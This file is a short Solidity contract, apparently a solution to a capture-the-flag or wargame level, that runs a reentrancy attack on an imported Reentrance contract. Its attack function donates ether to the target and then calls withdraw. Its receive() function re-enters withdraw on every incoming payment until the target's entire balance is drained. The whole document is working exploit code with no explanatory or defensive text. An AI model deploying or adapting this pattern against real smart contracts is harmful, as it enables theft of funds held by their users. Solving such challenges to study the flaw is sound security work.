// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Reentrance.sol";

contract ReentranceHack {
    Reentrance public reentrance;
    uint public initialDepo;

    constructor(address payable _addrReentrance) {
        initialDepo = 0;
        reentrance = Reentrance(_addrReentrance);
    }

    receive() external payable {
        callWithdraw();
    }

    function attack() public payable {
        require(msg.value >= 0.1 ether, "send some more ether");

        initialDepo = msg.value;
        reentrance.donate{value: initialDepo}(address(this));
        callWithdraw();
    }

    function callWithdraw() private {
        uint256 challengeTotalRemainingBalance = address(reentrance).balance;
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw = initialDepo < challengeTotalRemainingBalance
                ? initialDepo
                : challengeTotalRemainingBalance;
            reentrance.withdraw(toWithdraw);
        }
    }
}
